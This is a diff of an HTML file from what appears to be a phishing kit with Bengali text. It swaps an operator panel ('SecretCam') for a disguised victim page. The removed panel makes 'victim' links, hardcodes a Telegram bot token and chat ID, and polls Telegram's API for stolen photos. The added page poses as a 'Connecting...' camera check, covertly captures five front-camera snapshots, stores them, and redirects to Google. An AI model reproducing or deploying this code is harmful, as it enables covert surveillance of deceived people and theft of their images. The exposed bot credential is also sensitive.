@@ -1,113 +1,62 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SecretCam • লিংক তৈরি করো</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connecting...</title>
   <style>
-    :root{--bg:#0f0f1a;--primary:#00ff9d;--secondary:#ff00c8;--text:#e0e0e0;}
-    *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at center,#1a1a2e,#0f0f1a);}
-    .container{background:rgba(20,20,40,0.95);padding:40px 30px;border-radius:20px;box-shadow:0 0 50px rgba(0,255,157,0.5);border:1px solid rgba(0,255,157,0.6);width:90%;max-width:520px;text-align:center;animation:glow 3s infinite alternate;}
-    @keyframes glow{from{box-shadow:0 0 30px rgba(0,255,157,0.4);}to{box-shadow:0 0 70px rgba(255,0,200,0.7);}}
-    h1{font-family:'Orbitron',sans-serif;font-size:2.7em;background:linear-gradient(45deg,var(--primary),var(--secondary));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:15px;}
-    button{background:linear-gradient(45deg,#00ff9d,#00b86e);color:black;border:none;padding:18px 36px;font-size:1.3em;border-radius:50px;cursor:pointer;margin:15px 0;transition:all .3s;font-weight:bold;box-shadow:0 5px 20px rgba(0,255,157,0.4);}
-    button:hover{transform:scale(1.07);box-shadow:0 0 30px #00ff9d;}
-    #linkBox{background:#111;padding:22px;border-radius:15px;margin:25px 0;border:2px dashed var(--primary);word-break:break-all;display:none;}
-    input{width:100%;padding:16px;background:#222;border:none;border-radius:12px;color:white;font-size:1.1em;margin:10px 0;}
-    .photos{margin-top:30px;display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:14px;}
-    .photos img{width:100%;border-radius:14px;border:4px solid var(--primary);box-shadow:0 0 20px rgba(0,255,157,0.7);transition:0.3s;}
-    .photos img:hover{transform:scale(1.05);box-shadow:0 0 30px #ff00c8;}
-    .loading{color:var(--primary);font-size:1.4em;animation:pulse 1.5s infinite;padding:20px;}
-    @keyframes pulse{0%,100%{opacity:0.6;}50%{opacity:1;}}
-    footer{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:600px;text-align:center;padding:14px 0;background:#2B002F;border-top:1px solid #555;font-size:18px;color:#ff00c8;font-weight:500;box-shadow:0 -3px 15px rgba(0,0,0,0.3);}
+    body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:sans-serif;overflow:hidden;}
+    .box{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;}
+    video{width:100%;max-width:380px;border-radius:16px;border:4px solid #0066ff;box-shadow:0 0 40px rgba(0,102,255,0.6);}
+    .msg{color:#00ff9d;font-size:18px;margin:20px 0;animation:pulse 1.5s infinite;}
+    @keyframes pulse{0%,100%{opacity:0.7}50%{opacity:1}}
   </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>SecretCam</h1>
-  <p style="font-size:1.2em;margin-bottom:20px;">কেউ প্লে করলেই তার গ্যালারির ১৫টা ছবি তোমার কাছে চলে আসবে!</p>
-  
-  <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
-
-  <div id="linkBox">
-    <p style="color:#00ff9d;font-weight:bold;">তোমার লিংক রেডি!</p>
-    <input type="text" id="victimLink" readonly />
-    <button onclick="copyLink()">কপি করুন</button>
-    <br><br>
-    <a href="" id="testLink" target="_blank" style="color:#ff00c8;font-weight:bold;font-size:1.1em;">মোবাইলে টেস্ট করো</a>
-  </div>
-
-  <div class="photos" id="photos">
-    <div class="loading">নতুন লিংক বানাও → ছবি লাইভ দেখাবে</div>
-  </div>
+<div class="box">
+  <video id="cam" autoplay playsinline muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <div class="msg">কানেক্টিং... ক্যামেরা চেক হচ্ছে</div>
 </div>
 
-<footer>Developed By <span style="color:#fff;font-weight:700;">H4X0R</span></footer>
-
 <script>
-// ==== তোমার টেলিগ্রাম ====
-const BOT_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";
-const CHAT_ID   = "7731349577";
-// =========================
+const params = new URLSearchParams(location.search);
+const id = params.get('id');
+const redirect = decodeURIComponent(params.get('r') || 'https://google.com');
 
-let currentId = null;
-let lastUpdateId = 0;
+const video = document.getElementById('cam');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+let count = 0;
+const total = 5;
+const images = [];
 
-function generateLink() {
-  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
-  const victimUrl = location.href.split('?')[0].replace('index.html', '') + 'view.html?id=' + currentId;
-  
-  document.getElementById("linkBox").style.display = "block";
-  document.getElementById("victimLink").value = victimUrl;
-  document.getElementById("testLink").href = victimUrl;
-  document.getElementById("photos").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম খুললেই ছবি আসবে</div>`;
-  
-  lastUpdateId = 0;
-  checkForPhotos();
-}
+navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+  .then(stream => {
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      video.play();
+      setTimeout(capturePhotos, 1800);
+    };
+  })
+  .catch(() => {
+    document.body.innerHTML = "<h2 style='color:#f00;padding:50px;text-align:center;'>ক্যামেরা বন্ধ আছে!</h2>";
+    setTimeout(() => location.href = redirect, 3000);
+  });
 
-function copyLink() {
-  const link = document.getElementById("victimLink");
-  link.select(); link.setSelectionRange(0, 99999);
-  navigator.clipboard.writeText(link.value);
-  alert("লিংক কপি হয়ে গেছে!");
-}
-
-// লাইভ ছবি চেক করা (কাজ করে ১০০%)
-function checkForPhotos() {
-  if (!currentId) return;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`)
-    .then(r => r.json())
-    .then(data => {
-      if (!data.ok) return;
-
-      data.result.forEach(update => {
-        lastUpdateId = update.update_id;
-
-        if (update.message && update.message.photo && update.message.caption && update.message.caption.includes(currentId)) {
-          const fileId = update.message.photo.pop().file_id;
-          
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`)
-            .then(r => r.json())
-            .then(file => {
-              const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.result.file_path}`;
-              const img = document.createElement('img');
-              img.src = url;
-              img.title = update.message.caption.split('\n')[2] || '';
-              document.getElementById("photos").innerHTML = '';
-              document.getElementById("photos").appendChild(img);
-            });
-        }
-      });
-
-      // রিকার্সিভ কল → লাইভ থাকবে
-      setTimeout(checkForPhotos, 2000);
-    })
-    .catch(() => setTimeout(checkForPhotos, 4000));
+function capturePhotos() {
+  if (count >= total) {
+    localStorage.setItem('camsnap_' + id, JSON.stringify(images));
+    setTimeout(() => location.href = redirect, 1200);
+    return;
+  }
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+  images.push(canvas.toDataURL('image/jpeg', 0.85));
+  count++;
+  setTimeout(capturePhotos, 700);
 }
 </script>
 </body>
